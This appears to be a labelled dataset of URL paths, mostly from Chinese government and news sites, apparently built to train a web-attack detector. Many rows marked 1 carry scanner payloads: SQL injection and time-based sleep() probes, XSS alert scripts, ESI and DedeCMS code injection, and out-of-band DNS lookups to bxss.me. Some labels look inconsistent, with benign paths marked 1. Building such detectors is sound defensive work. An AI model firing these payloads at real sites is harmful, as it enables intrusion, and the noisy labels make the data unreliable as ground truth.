sentences	labels
/***/20180410/4756.html 	 0
/****/yangzhi_65.html 	 0
socket.gethostbyname(""hituu"" ""kzplolxe577e5.bxss.me."")[3].to_s) ""/***************/16/images/jquery.waterfall.js 	 1
/****/kjzl/xyfw/jcjg/ 	 0
/**********/system/2021/07/08/013415478.shtml 	 0
/**/mediacenter/engagement/202101/t20210129_270016.html 	 0
/***/003/004/469/00300446993_4c3d8215.jpg 	 0
/*****/search.asp?field=my_baizi&classid=&keyword=\ufffd\u2ce4\ufffd\ufffd 	 0
/***/2020/12/15/art'||'_31_223689.html 	 1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u91d1\u76fe\u9632\u6c34\u6750\u6599\u7ecf\u9500\u90e8 	 0
/****/zhengce/zfwjn/202105/p020210518584367393241.xls 	 0
/****/xxgkml/qtfdxx/hygq_3720/rdhy/202002/t20200224_148181.html 	 0
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqfpb/ 	 0
/*******/2ib32s4e.php 	 1
/***/0/10/43/77/10437706_999610.jpg 	 0
/****/jjgz/202103/t20210309_271174.html 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5ba3\u548c\u9547\u4f0f\u5a1f\u9ebb\u8fa3\u70eb\u5e97 	 0
/****/gjgk/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
/***********/zaojianpinglun/?_=1640016384146 	 0
/****/main/calendar/agenda_list.php?type=personal' onmouseover='confirm(777)'/><!-- 	 1
/**********/system/2021/05/18/013386930.shtml 	 0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u9999\u987a\u519c\u5bb6\u83dc\u9986 	 0
/****/gyjl/ 	 0
/***/advert?data={"ad_type":5,"channel_type":4,"channel_id":12501,"place_id":"fm_sp_ard","news_id":"993641"} 	 0
/enjoymobilexcx_mt/****/getpicverifycode?mobile=112558040&type=\u9884\u7ea6&dt=1640016424084 	 0
/*********/20211123/javascript:void(0); 	 1
/**/zwxmtjz/tj/wx/201908/w020190822694521478621.jpg 	 0
/******/visitcount/visit.jsp?type=2&i_columnid=34&i_webid=1 and 1=1 	 1
/****/b-e128150.html 	 0
/**********/system/2020/10/27/013272341.shtml 	 0
/******/public/2021/12/03/20211203_17d7f0b61bd_r1_1200k.mp4 	 0
/****/xxgkml/qtfdxx/zcjd/qwjd/201812/t20181228_112934.html 	 0
/******/2015qglh/shgg/ 	 0
/****/sjhbdc/ 	 0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u7433\u8863\u9601\u670d\u88c5\u5e97 	 0
/****/dqgz/201811/t20181109_195239.html 	 0
/*****//507/0dol0m4m/xhr_send?t=1633740961270 	 1
/****/system/2006/08/23/javascript:window.close(); 	 1
/******/ew/20170620142501368001.png 	 0
/****/xyfw/' and 'x'='x 	 1
/**************/newscenter/newscenter/ 	 0
/**********/system/2021/11/13/013479525.shtml 	 0
/****/system/2015/04/30/011702696.shtml 	 0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u817e\u8fbe\u7efc\u5408\u95e8\u5e02\u90e8 	 0
/****/xh/hy/202012/t20201223_2536753.html 	 0
/******/nxslh-mid-icon01.png 	 0
/************/0'xor(if(now()=sysdate(),sleep(6),0))xor'z/ 	 1
/***/0/02/02/54/2025421_087801.jpg 	 0
/****/zzxxgk/bmfgj/fgfzgg_2770/fggzdt/ 	 0
/****/czgk/bmjs/zzqjcyxt/ycsrmjcy 	 0
/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/****/jcgc/ 	 1
/****/201909/t20190926_1757748.html 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(4734)">?_=1630312115101 	 1
/******/cms/www/201609/13173729gk4w.jpg 	 0
/***/layui/lay/modules/element.js?v=1639972890829 	 0
/****/whln/javascript:stranbody(); 	 1
/zwxx_11337/****/202006/t20200628_2148053.html 	 0
/****/bmkx/sjhj/201910/t20191025_143567.html 	 0
/******/jslib/jquery'||'/jquery.js 	 1
/******/if(now()=sysdate(),sleep(12),0)/js/news/mp4video.js 	 1
/***/mobile_h5/wapshouye.do?channelid=dujia 	 1
/****/20210221/e116767429.html 	 0
/**/dszy/9.html 	 0
/***/0/02/11/68/2116888_372957.jpg 	 0
/*******/p5ow2v9s.php 	 1
/******/usercenter/index?qrcode=quicklyrq,3,15700,10382306&code=091mc7ga1nvekc0qd5ga1smxgv1mc7g0 	 0
/*******/col200/index.html 	 1
/*/main/calendar/agenda_list.php?type=personal' onmouseover='confirm(777)'/><!-- 	 1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u7acb\u98de\u997c\u5b50\u5e97 	 0
/*****/system/2019/06/12/javascript:void(0); 	 1
/**********/system/2020/05/08/013157108.shtml 	 0
/**/system/2021/12/03/012227105.shtml 	 0
/****/20201204/e111703302.html 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5b66\u7434\u9762\u9986 	 0
/****/zgsdt/2021_qydt/202111/kjcx/kjdt/ 	 0
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202111/t20211116_196555.html 	 0
/****/xh/hd/201706/w020170728435288165855.jpg 	 0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u9633\u5149\u5929\u5730\u5e7f\u544a\u88c5\u9970\u884c 	 0
/***/0/01/49/51/1495147_974949.jpg 	 0
/*******/qiye/b-e327419.html 	 0
/"".gethostbyname(lc(""hitnw"".""akzkompp4231c.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(118).chr(83).chr(121).chr(87).""/******/tjj/ 	 1
/**/system/2021/08/11/012190568.shtml and 1=1 	 1
/****************/file/loadimage/?id=fc6d5764-eeef-40b3-b6d1-13c214afa31e&dt=2021-12-20_10:22:00 	 0
/************/search.do?begin=20201023&end=20211023&eq=1&oq=1&p=1&pg=1&pos=filenumber&q=请输入关键词&searchid=1&tpl=16&websiteid=if(now()=sysdate(),sleep(15),0) 	 1
/****/b-e903517.html 	 0
/**********/system/2021/12/20/013497374.shtml 	 0
/****/byyw/202103/t20210319_178731_wap.html 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u7530\u80d6\u5b50\u9910\u9986 	 0
/zwxx_11337/****/202002/t20200207_1944617.html 	 0
/****/ and 1=1 	 1
/***/0/10/00/32/10003201_753804.jpg 	 1
/****/dxzdj/images/ 	 1
/**********/system/2021/06/21/013405362.shtml 	 0
/****/tag_test_action.php?partcode={dede:field name='source' runphp='yes'}echo md52001228177&token=&url=a&{/dede:field}= 	 1
/****/20210201/9374.html 	 0
/******/wp-admin/admin-post.php?page=fancybox-for-wordpress 	 1
/***/nbhd/opengovmsgbox.do?method=viewgovmsgbox&siteid=115&metadataid=10062499 	 0
/****/index.cfm?field="">alert(777) 	 1
/****/czgk/bmyjs/qtdw/zzqmksjy/202103/t20210309_2619820.html 	 0
/*********/articlelist_4g4.do?columnarticlelistdeal_4g4_channelid_ss=channelid&columnarticlelistdeal_4g4_contenttype_ss=channelid&channelid=quyu¤tpage=1 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u91d1\u9e3f\u4ea8\u946b\u5e7f\u544a\u88c5\u9970\u6709\u9650\u516c\u53f8 	 0
/***/interface/comul_total.json.jsp?callback=jquery19103812260022957761_1640035970320 	 0
/****/gjgk/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
/*****/h1598491588.html 	 0
/******/index_searbg.png 	 0
/****/ccp_48498/zwhd/202112/t20211205_3196017.html 	 0
/*****/0/02/03/21/2032149_933319.mp4 	 0
/*****/hero_os/search?q="" onmouseover=alert(777) ="" 	 1
/****/dashboard/index/41730?did=4&period=3"">alert(/777/) 	 1
/****/0905/794927.shtml 	 0
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/nxrbbyjt/201802/t20180223_693419.html 	 0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u8bb8\u53ef\u8bc1 	 0
/********/mobiledoc/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> 	 1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtgmftjb7n4pjad36yx5mh9m=&openid=ovl7jjmxkperffkrv8zefwphjzds&outer_str=3258&activate_ticket=fdzv9emqaffrnr3xboqhbzqlf8eixz5kylfzwx0bm/voo8dbj5 fzedtzplsmcarprw0rjkjsoxgv/3pxbfq5i8gxwipu5vza7tdcvrbzyo= 	 0
/****/zgsdt/gzxwzgsdt/201412/t20141218_43437.html 	 0
/******/public/2021/02/05/102362.images/v102362_b1612490536471.jpg 	 0
/****/bmkx/sfgw/201807/t20180723_105846.html 	 0
/*****/gy48/cpgyss.asp?key=h\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd&l=\ufffd\u3dab 	 0
/****/web/search?channelid=299868' or 1251=4865  	 1
/****/mtgz/mt17_6390/201812/xxgk/qyzdsx/index_25.html 	 0
/****/\u0177\ufffd\ufffd?page=2 	 0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u7530\u5f66\u5947\u5364\u8089\u5e97 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u98df\u901f\u9c9c\u98df\u54c1\u914d\u9001\u6709\u9650\u516c\u53f8 	 0
/******/ew/20201109155359121004.png 	 0
/****/czgk/bmjs/zzqjcyxt/plxrmjcy/201805/t20180524_765571.html 	 0
/***/col264/index.html"" and ""x""=""y 	 1
/*****/b-e1765118.html 	 0
/****/system/2021/09/19/javascript:dozoom(12) 	 1
/z'""()&%<acx><script >bhug(9808)</script>/******/index/3494307764da7f36733716be7abc7a9b.js 	 1
/**********/system/2021/08/31/ data:image/svg xml,<svg width= 	 1
/***/index.cfm?error.diagnostics="">alert(777) 	 1
/**********/system/2021/01/22/013324162.shtml 	 0
/******/visitcount/visit.jsp?type=3&i_webid=1&i_columnid=121&i_articleid=222582 	 0
/**/compact.cfm?fusebox.ajax="">alert(777) 	 1
/*******/8n8yqdpj.php 	 1
/**/ourbusiness/finance/202101/t20210129_269906.html 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(411)">?_=1630311396124 	 1
/****/system/2012/11/29/010965737.shtml 	 0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime' or 5852=5852 /*&perpage=15&outlinepage=10 	 1
socket.gethostbyname(""hitqm"" ""ovxtidsrc92b1.bxss.me."")[3].to_s) ""/****/110105008056111/16/images/style.css 	 1
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqwhhlyt/zzqlyfzwyh/201808/t20180816_978318.html 	 0
/****/web/search?channelid=299868&perpage=1000' or 2407=2476 /* 	 1
/****/bmkx/sczj/202109/t20210910_186516.html 	 0
/**********/qhsz/javascript:void(); 	 1
/********/public/initpage2.jsp?channelid=11219&infoviewid=41 	 0
/****************/notification/negotiate?access_token=552cb7ac-2a4e-42ae-a7dc-060ee94fcd71 	 0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u9526\u60a6\u5316\u5986\u57ce 	 0
/****/xqdt/hnx/201610/t20161025_50896.html 	 0
/*****/mswpmm/common/newaccount.aspx?ddlculture=alert(777) 	 1
/******/ew/20161024140029577.jpg 	 0
/**/ui/lib/easyui/http://bxss.me/t/fit.txt?.jpg/jquery.panel.js 	 1
/***/5pijxitt/xhr_send?t=1632404147331 	 1
/***/interface/daily_clickcount.json.jsp?callback=jquery19103656582948199607_1639972984534 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5929\u7f8e\u7231\u4e0a\u7f8e\u5986\u5e97\u9f13\u697c\u897f\u8857\u5e97 	 0
/******/system/2017/01/03/javascript:window.close(); 	 1
/***/0/01/94/46/1944624_990413.jpg 	 0
/**********/system/2021/12/17/013495644.shtml 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u7f8e\u8d1d\u8d38\u6613\u6709\u9650\u516c\u53f8 	 0
/****/system/2020/12/04/javascript:dozoom(14) 	 1
/*****/system/2021/02/10/javascript:window.print() 	 1
/*****/system/2020/01/14/javascript:void(); 	 1
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/zzqjdglj/201712/t20171211_632521.html 	 0
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/csjs/1.htm 	 1
/****/web/search?channelid=222832&searchword=\u77f3\u5634\u5c71\u5e02\u60e0\u519c\u533a\u767e\u5fb7\u7b4b\u9aa8\u901a\u8d34\u5bb6\u5c45\u7528\u54c1\u751f\u6d3b\u9986\u4e8c\u5206\u5e97 	 0
/****/xqdt/byq/201808/w020180813351842332893.jpg 	 0
/**/sustainability/csrreports/201902/p020210119380722294028.pdf 	 0
/**********/system/2021/06/08/013398506.shtml 	 0
/****/zscq/ 	 0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u5f18\u8fbe\u5546\u884c 	 0
/zwxx_11337/****/202104/t20210406_2689057_zzb.html 	 0
/****/system/2021/12/21/javascript:window.close(); 	 1
/jsearchfront'||'/********/jcse/110105008056111/16/images/autocomplete.css 	 1
/**********/system/2021/12/17/013496041.shtml 	 0
/******/system/2021/04/03/013362505.shtml 	 0
/*******/qiye/b-e2564111.html 	 0
/*****/gy48/cpgyss.asp?key=\ufffd\u0536\ufffd\ufffd\u05f1\ufffd\ufffd&l=\ufffd\ufffd\ufffd 	 0
/***/0/02/11/99/2119960_757718.jpg 	 0
/***/0/02/00/18/2001830_638731.png 	 0
/******/resource/code/datainput.jsp?owner=') and 1687=1687 and ('1'='1 	 1
/******/jslib/ckplayer/ckplayer.js/"><script>alert(4994)</script>?_=1630312239493 	 1
/************/categorysearch.do?cateid=1&p=1<esi:include src=""http://bxss.me/rpb.png""/>&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 	 1
/****/bmkx/swjw/201904/w020190404772115958420.jpg 	 0
/****/zgsdt/2019_qydt/201905/t20190514_212788.html 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u7545\u54c1\u9ebb\u8fa3\u70eb\u5e97 	 0
/****/sso?ssocallback=getusid&r=1639972874184 	 0
/****/czgk/bmyjs/zzqfyxt/jyxrmfy/\"javascript:void(0)\" 	 1
/**/system/2021/01/06/012112487.shtml 	 0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=knowin 	 0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtfqz4ar4meslrshfyh82tle=&openid=ovl7jjjytc9fgxptrwgysp97tssg&activate_ticket=fdzv9emqaffrnr3xboqhbzae0d5wukhmyd2uv2izofhoo8dbj5 fzedtzplsmcarhf5r3cpeqe4k 7uwbwm4l0addhnltu5com6o2voyaew= 	 0
/******/system/2021/09/10/013449514.shtml 	 0
/****/system/2014/10/08/011524580.shtml 	 0
/****/system/2016/01/20/javascript:window.print() 	 1
/*********/articlelist_4g4.do?columnarticlelistdeal_4g4_channelid_ss=channelid&columnarticlelistdeal_4g4_contenttype_ss=channelid&channelid=louguan¤tpage=1 	 0
/***/interface/comul_total.json.jsp?callback=jquery19109706003891961223_1640026094828 	 0
/***/interface/daily_clickcount.json.jsp?callback=jquery171003574093897124264_1639973238838 	 0
/***/myapproval/summoney 	 0
/'""()&%<acx><script >67jp(9441)</script>/********/jcse/110105008056111/16/images/ui.css 	 1
/****/b-e865601.html 	 0
/**/setup/0'xor(if(now()=sysdate(),sleep(15),0))xor'z.do 	 1
/****/gccb/wjwszzgc/images/ 	 1
/***/003/004/281/00300428174_dd3cdc42.png 	 0
/**/sys/sys/listabd2.jsp?bd="/><script>alert(777)</script> 	 1
/**/cat1.php?id2=0&pricestart=0&room=&flache=&price=&zulassung=&kilometer=&kraftstoff=&id3=0&suche="><script>alert(777);</script>&id=0&suchewo=&umkreis=0 	 1
/****/lzqh/jtdt/202111/t20211115_320584.html 	 0
/****/zgsdt/2020_qydt/202007/w020200727785884657123.jpg 	 0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u6893\u9633\u4fbf\u6c11\u8d85\u5e02 	 0
/****/js/chunk-7c6e49b2.e8d703bd.js 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u8fdb\u9e4f\u5bb6\u5ead\u519c\u573a 	 0
/**********/system/2021/07/07/013414748.shtml 	 0
/****/qzfwj/201801/t20180115_669396.html/index_1.html 	 0
/**********/system/2020/04/11/013137606.shtml 	 0
/*******/202001/202001161954231174.html 	 0
/****/pic3/tjc.jpg 	 0
/************/template/jcse/110105008056111/16/images/plugin/voice/bxss.me.css 	 1
/******/jyxwsj 	 0
/********/plus/sky.php 	 1
/****/ssgs/clgf/' and 'x'='x 	 1
/****/zzxxgk/wsjkwyh/xxgk_3565/zfxxgkml_3570/zcjd_3583/list.html 	 0
/****/20211124/javascript:void(0); 	 1
/****/bmkx/gjj/201807/t20180702_104943.html 	 0
/***/0/02/12/43/2124384_220440.jpg 	 0
/**********/system/2020/07/05/013198998.shtml 	 0
/****/czgk/bmyjs/zzqjcyxt/jfqrmjcy/201901/t20190114_1250338.html 	 0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u9ad8\u5e9c\u9152\u697c 	 0
/**********/system/2021/11/30/013488177.shtml 	 0
/****/web/search?searchword=*/-->'""></iframe></script></style></title></textarea><script >alert(48771)</script> 	 1
/****/zxta/202112/t20211208_3209982.html 	 0
/********/admin/edit.php?title="">pt>alert(777);< /script>pt> 	 1
/***/0/01/55/00/1550084_981323.png 	 0
/**/ui'""()&%<acx><script >hnk7(9588)</script>/lib/security/sm2.js 	 1
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u73cd\u59ae\u7efc\u5408\u5546\u5e97 	 0
/***/mswpmm/common/newaccount.aspx?btncreateaccount=alert(777) 	 1
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u6768\u5065\u6069\u84b8\u6c7d\u6d17\u8f66\u65f6\u4ee3\u670d\u52a1\u4e2d\u5fc3 	 0
/**********/system/2021/11/10/013478253.shtml 	 0
/******/login.php 	 1
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(1044)">?_=1630311717387 	 1
/***/0/00/55/95/559546_997258.jpg 	 1
/**********/system/2020/11/05/013277842.shtml 	 0
/zwxx_11337/****/202106/t20210618_2892399.html 	 0
/******/20150114.jpg 	 0
/*********/treasury/index.aspx?nodeid=394%' and 9448=5016 and '%'=' 	 1
/******/scripts?chart_settings=<settings></settings>&chart_data=<chart><message><![cdata[<a href=""javascript:alert(1)"">click</a>]]></message></chart>&.swf 	 1
/***/col41/index.html/"><script>alert(934)</script> 	 1
/****/bmkx/sfgw/201908/w020190806376019520782.png 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u987a\u5143\u901a\u673a\u68b0\u79df\u8d41\u6709\u9650\u516c\u53f8 	 0
/******/20211112.jpg 	 0
/****/digg.php 	 1
/***********/zaojianpinglun/?_=1640035278531 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5409\u7965\u6052\u901a\u526f\u98df\u5546\u884c 	 0
/****/czgk/bmyjs/zzqfyxt/plxrmfy/ 	 0
/****/kycg/' and 'x'='x 	 1
/***/0/00/29/54/295415_047191.jpg 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(409)">?_=1630311396124 	 1
/***/blockdata/articlelist_4g3.do?channelarticlelist_4g3_channelid_ss=channelid&channelid=shitishangye¤tpage=15&query=java 	 0
/****/bmkx/stjj/202007/t20200724_169696.html 	 0
/****/whhd/201803/t20180305_183321.html' and 'x'='y 	 1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u79be\u6728\u5c45\u5bb6\u5177\u7ecf\u9500\u90e8 	 0
/zwxx_11337/****/202108/t20210817_2976495.html 	 0
/****/phpwiki/index.php?pagename=</script><script>alert(777)</script><!-- 	 1
/***/0/02/11/97/2119792_707669.jpg 	 0
/**/index.php?do=post&id=294&c=dt&a=goods& 	 1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u7f8e\u59ae\u5b50\u5973\u88c5\u5e97 	 0
/****/bmkx/sfgw/201610/t20161025_14161.html 	 0
/****/zgsmt 	 0
/**********/system/2020/05/10/013158190.shtml 	 0
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u6d77\u94f6\u884c\u80a1\u4efd\u6709\u9650\u516c\u53f8 \u4f5c\u5f0a 	 0
/****/web/sa2/scriptlist.do?gui_pagenotabledata=><script>alert(777)</script> 	 1
/******/resource/code/datainput.jsp?owner=1329914701&e=1&w=1440&h=900&treeid=1071&refer=ahr0cdovl3d3dy5uegpzy3guy29tlmnul3f5c2ouahrt&pagename=l2n5x2xpc3quannw&newsid=-1 	 0
/*****/202109/t20210901_186247.html?leader=\u6768\u4e07\u519b 	 0
/****/byszx/201611/t20161121_76520.html?leader=bxss.me 	 1
/******/hfhnxz/202110/t20211008_195125.html 	 0
/****/jtdt/2013jtdt/ 	 0
/****/bmkx/sfgw/202010/w020201020341107269237.png 	 0
/****/web/search?channelid=222832&searchword=\u9686\u5fb7\u53bf\u7267\u5eb7\u9972\u6599\u4e13\u8425\u5e97 	 0
/**********/system/more/220000000000000/0001/220000000000000_00000194.shtml 	 0
/****/xqldly/hfbyqz/202106/t20210625_184070.html 	 0
/****/czgk/bmjs/zzqrdcwh/zzqrdcwhbgt/201808/p020180816616335450886.ceb 	 0
/****/admin/edit.php?title="">pt>alert(777);< /script>pt> 	 1
/**********/system/2019/05/07/012872838.shtml 	 1
/******/resource%' and 2*3*8=6*8 and 'pn5h'!='pn5h%/js/dynclicks.js 	 1
/******/sp3-bgrt.png 	 0
/************/template/jcse"" and 2*3*8=6*8 and ""3ea5""=""3ea5/110105008056111/16/images/ui.css 	 1
/***/viewspace-419.html 	 0
/****/uploads/major_business/image/245273/thumb_l_9_meitu_7.jpg 	 0
/******/system/2020/10/12/javascript:window.print() 	 1
/**********/system/2021/12/18/013496438.shtml 	 0
/***/portal?act=xiangguan&lc=0&r=0.5424110290848883 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u946b\u5bff\u5802\u517b\u751f\u4e2d\u5fc3 	 0
/************/http://bxss.me/t/fit.txt?.jpg/jcse/110105008056111/16/images/result.css 	 1
/****/tzgg/2014tzgg/201501/images/jquery_xw.js 	 0
/******/public/2021/11/22/110577.images/v110577_b1637546470003_app.jpg 	 0
/**********/system/2021/09/18/013453476.shtml 	 0
/****/qybs/202010/w020201026366105190741.png 	 0
/****/gjzqq/fz/jny/201412/w020141225508613988169.png 	 0
/**/system/2009/08/09/002788466.shtml 	 1
/******/ 	 1
/***/web/sa3/addholiday.do 	 1
/******/qhqy/dlsy 	 0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrthmd8tqyu/yuyty9njwnt14=&openid=ovl7jjn-dzpwvmxp_3h_yws3sema&outer_str=49893&activate_ticket=fdzv9emqaffrnr3xboqhb0yvjyi3ol3x8khgr0hkcxvoo8dbj5 fzedtzplsmcarprw0rjkjsoxgv/3pxbfq5mifbynjbvyqgszudiyhopq= 	 0
/****/main/admin/session_edit.php?page=resume_session.php" onmouseover=confirm(777)//&id=1 	 1
/****/?cmd=new_section§ion="%3<script>alert(777);</script> 	 1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u672a\u6765\u8bfb\u4e66\u793e\u4e09\u5206\u5e97 	 0
/****/qzfwj/202110/p020211011586733190619.docx 	 0
/************/template/jcse<esi:include src=""http://bxss.me/rpb.png""/>/110105008056111/16/images/plugin/voice/hzrecorder.js 	 1
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqlyt/ 	 0
/****/whs/yw_1286/202009/t20200903_2215792.html 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5b81\u4e1c\u6c38\u76db\u91cd\u578b\u6c7d\u4fee 	 0
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqnky/201609/t20160922_317980.html 	 0
/***/0/01/89/48/1894853_178841.jpg 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u9ed1\u56de\u9e2d\u9e2d\u8116\u5e97\u80dc\u5229\u8857\u5e97 	 0
/******/637/jquery-1.8.3.min.js/"><script>alert(5833)</script> 	 1
/*******/qiye/b-e810335.html 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u672c\u8272\u70e4\u5427 	 0
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u65b9\u9547 	 0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtlg1hxsja1xj8omqc8lhvi0=&openid=ovl7jjl8b6u04fbpamzujybh8jm4&outer_str=41209&activate_ticket=fdzv9emqaffrnr3xboqhbxk52fxci7/3e oqgamjpbjhfifidrt1ejnprxbtx1zvvtoeweb2ajcq9n ppbt8ihabqcj9cekgwjxrcbf3kfc= 	 0
/**********/2021-04-12.html 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u675e\u8d5f\u519c\u4e1a\u4e13\u4e1a\u5408\u4f5c\u793e 	 0
/**********/system/2020/04/10/013137047.shtml 	 0
/xxgk' and 2*3*8=6*8 and 'pknt'='pknt/******/tjj/ 	 1
/******/system/2011/01/09/010268351.shtml 	 0
/****/zxft/202003/t20200304_1978740.html 	 0
/****/tzgg/202110/"> 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5c0f\u9a6c\u6e05\u771f\u624b\u5de5\u9992\u5934\u5e97 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u660e\u5b89\u82b1\u5349\u7ecf\u9500\u90e8 	 0
/zwxx_11337/***/201803/t20180307_699301.html 	 0
/****/category/qiyexinxi?page=1 and 5536=5536# 	 1
/***/0/01/93/64/1936477_757270.jpg 	 0
/****/system/2021/08/25/013439990.shtml 	 0
/******/tp_next.png 	 0
/****/yd/yw_1280/ 	 0
/zwxx_11337/****/202104/t20210420_2792225_zzb.html 	 0
/******/qhkc/js/""><script>alert(281)</script> 	 1
/****/czgk/bmyjs/zzqfyxt/yzqrmfy/index_1.html 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u51e1\u666f\u7a7a\u95f4\u56fe\u6587\u8bbe\u8ba1\u5de5\u4f5c\u5ba4 	 0
/****/bmkx/sfgw/202011/" 	 0
/**/ui/lib/easyui/plugins<esi:include src=""http://bxss.me/rpb.png""/>/jquery.panel.js 	 1
/***/003/003/711/00300371106_69c446f4.jpg 	 0
